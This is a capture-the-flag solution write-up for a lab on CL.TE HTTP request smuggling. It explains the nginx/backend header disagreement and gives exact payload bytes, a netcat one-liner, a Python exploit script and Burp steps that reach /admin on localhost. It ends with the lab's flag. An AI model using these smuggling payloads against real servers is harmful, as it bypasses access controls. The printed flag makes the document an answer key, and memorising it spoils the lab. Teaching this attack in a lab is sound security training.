# SOLUTION — Lab 05 · HTTP Request Smuggling (CL.TE)

## Vulnerability

nginx (front-end) uses `Content-Length` to determine where the request body ends.
The backend uses `Transfer-Encoding: chunked` when both headers are present.

This disagreement allows smuggling a hidden second request past nginx's access controls.

## Architecture

```
Client --> nginx :80 --> backend :8000
                |
         blocks /admin externally
```

## Tooling compatibility

| Tool | Works | Reason |
|------|-------|--------|
| **nc + python3** | ✅ | Sends raw bytes, no modification |
| **Python script** | ✅ | Full control over the socket |
| **Burp Suite Repeater** | ✅ | HTTP/1.1 + disable Update-CL |
| **curl** | ❌ | Re-wraps body in chunked encoding |
| **Caido** | ❌ | Uses LF instead of CRLF — backend rejects the request |

> Use **nc** or the **Python script** below for a reliable result.

## Why curl does NOT work

curl automatically wraps the body in chunked encoding when `Transfer-Encoding: chunked`
is set. The payload arrives on the wire as a proper chunked body — no desync possible.

```
What you write:                  What curl actually sends on the wire:
--data-binary "0\r\n\r\n..."  -> 2d\r\n0\r\n\r\n...\r\n0\r\n\r\n
                                  ^^^ curl wraps your data inside a chunk
```

Use netcat, Python, or Burp Suite instead.

## Payload — exact bytes

```
POST /post HTTP/1.1
Host: localhost:5005
Content-Type: application/x-www-form-urlencoded
Content-Length: 50
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: localhost:5005

```

(Every line ends with CRLF, including the blank lines.)

### Byte count breakdown (Content-Length: 50)

| Part                         | Bytes |
|------------------------------|-------|
| 0\r\n  (chunk size 0)        | 3     |
| \r\n   (end of chunked body) | 2     |
| GET /admin HTTP/1.1\r\n      | 21    |
| Host: localhost:5005\r\n     | 22    |
| \r\n   (end of headers)      | 2     |
| **Total**                    | **50**|

## Option 1 — netcat

```bash
python3 -c "
import sys
sys.stdout.buffer.write(
    b'POST /post HTTP/1.1\r\n'
    b'Host: localhost:5005\r\n'
    b'Content-Type: application/x-www-form-urlencoded\r\n'
    b'Content-Length: 50\r\n'
    b'Transfer-Encoding: chunked\r\n'
    b'\r\n'
    b'0\r\n'
    b'\r\n'
    b'GET /admin HTTP/1.1\r\n'
    b'Host: localhost:5005\r\n'
    b'\r\n'
    b'GET / HTTP/1.1\r\n'
    b'Host: localhost:5005\r\n'
    b'\r\n'
)
" | nc -q 2 localhost 5005
```

The flag appears in the second HTTP response in the stream output.

## Option 2 — Python script

Save as `exploit.py` and run with `python3 exploit.py`:

```python
import socket, time, re

s = socket.socket()
s.connect(('localhost', 5005))
s.settimeout(3)

s.sendall(
    b'POST /post HTTP/1.1\r\n'
    b'Host: localhost:5005\r\n'
    b'Content-Type: application/x-www-form-urlencoded\r\n'
    b'Content-Length: 50\r\n'
    b'Transfer-Encoding: chunked\r\n'
    b'\r\n'
    b'0\r\n'
    b'\r\n'
    b'GET /admin HTTP/1.1\r\n'
    b'Host: localhost:5005\r\n'
    b'\r\n'
    b'GET / HTTP/1.1\r\n'
    b'Host: localhost:5005\r\n'
    b'\r\n'
)

time.sleep(0.4)
data = b''
try:
    while True:
        chunk = s.recv(4096)
        if not chunk:
            break
        data += chunk
except Exception:
    pass
s.close()

m = re.search(rb'HackUTT\{[^}]+\}', data)
print(m.group().decode() if m else 'flag not found')
```

## Option 3 — Burp Suite Repeater

1. Set target: localhost / 5005 / HTTP/1.1
2. Uncheck "Update Content-Length" in the Repeater toolbar
3. Select HTTP/1 in the protocol dropdown (not HTTP/2)
4. Paste the payload with CRLF line endings
5. Send -> first response is POST /post (200 OK)
6. Send again immediately on the same connection -> response is GET /admin (flag)

## Trace

```
nginx reads Content-Length: 50
  -> forwards exactly 50 bytes of body to backend
  -> considers this one request: POST /post

backend reads Transfer-Encoding: chunked
  -> "0\r\n\r\n" = end of chunked body after 5 bytes
  -> remaining 45 bytes = new request: GET /admin
  -> /admin processed internally, nginx ACL bypassed
  -> flag returned as the response to the next request on the connection
```

## Flag

```
HackUTT{CL_TE_smuggl1ng_fr0nt_b4ck_diss0nanc3}
```
